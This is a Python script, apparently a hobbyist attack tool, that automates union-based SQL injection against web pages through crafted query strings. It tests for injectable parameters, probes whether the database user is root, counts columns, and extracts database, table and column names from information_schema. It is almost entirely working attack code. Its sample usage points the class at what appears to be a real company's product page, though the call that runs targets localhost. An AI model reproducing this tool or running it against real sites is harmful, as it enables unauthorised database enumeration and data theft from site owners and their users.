import requests
from bs4 import BeautifulSoup

class DataSqlInjection:
    def __init__(self,url):
        self.url=url
        self.headers={"User-Agent": 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'} #设置好headers
        self.frist=requests.get(url+"?user=1")


    def AdjustInsert(self,url):
        url=url+str("?id=1word")
        try:
            r=requests.get(url)
            r.raise_for_status()
            r.encoding=r.apparent_encoding
            message=BeautifulSoup(r.text,"html.parser")
            if len(message):
                return "数字型SQL注入"
        except:
            return "出现了问题，程序被迫中断"

    def AdjustPower(self,url):
        url=url+str("?id=1 and ord(mid(user(),1,1))=114")
        r=requests.get(url)
        try:
            r.raise_for_status()
            r.encoding=r.apparent_encoding
            message=BeautifulSoup(r.text,"html.parser")
            if len(message.find_all("p"))>0:
                return "ROOT"
            else:
                return "admin"
        except:
            return False

    def NumberOfFileds(self,url):
        url=url+str("?id=1 union select 1")
        times=1
        def GetWEB(url):
            try:
                r=requests.get(url)
                r.raise_for_status()
                r.encoding=r.apparent_encoding
                message=BeautifulSoup(r.text,"html.parser")
                return message.find_all("div",{"calss":"guild"})
            except:
                return "Fail"
        Webinformation=GetWEB(url)
        while len(Webinformation)==0:
            times+=1
            url+=str(",1")
            Webinformation=GetWEB(url)
        return times

    def Getdatabase(self,url,times):
        Newurl=url+"?user=1 union select database()"
        for i in range(times-1):
            if i==times-2:
                Newurl+=",null limit 1,1"
            else:
                Newurl+=",null"
        print(Newurl)
        r=requests.get(Newurl)
        r.encoding = r.apparent_encoding
        message = BeautifulSoup(r.text, "html.parser")
        return message.find_all("p")

    def GetTable(self,url,database):
        url=url+"?user=1 union select 1,group_concat(table_name),3,null from information_schema.tables " \
                "where table_schema="+"\""+database+"\""+"limit 1,1"
        r=requests.get(url)
        r.encoding=r.apparent_encoding
        message=BeautifulSoup(r.text,"html.parser")
        # print(message)
        return message.find_all("p")

    def GetFileds(self,url,tablename,databasename,times):
        url=url+"?user=1 union select group_concat(column_name)"
        for i in range(times-1):
            if i==times-2:
                url+=",null from information_schema.columns where table_schema="+"\""+databasename+"\"" \
                    +"and table_name="+"\""+tablename+"\""+"limit 1,1"
            else:
                url+=",null"
        r=requests.get(url)
        r.encoding=r.apparent_encoding
        message=BeautifulSoup(r.text,"html.parser")
        return message.find_all("p")










Example=DataSqlInjection("http://www.ampak.com.tw/product.php")
print(Example.NumberOfFileds("http://127.0.0.1/SQL_inject.php"))














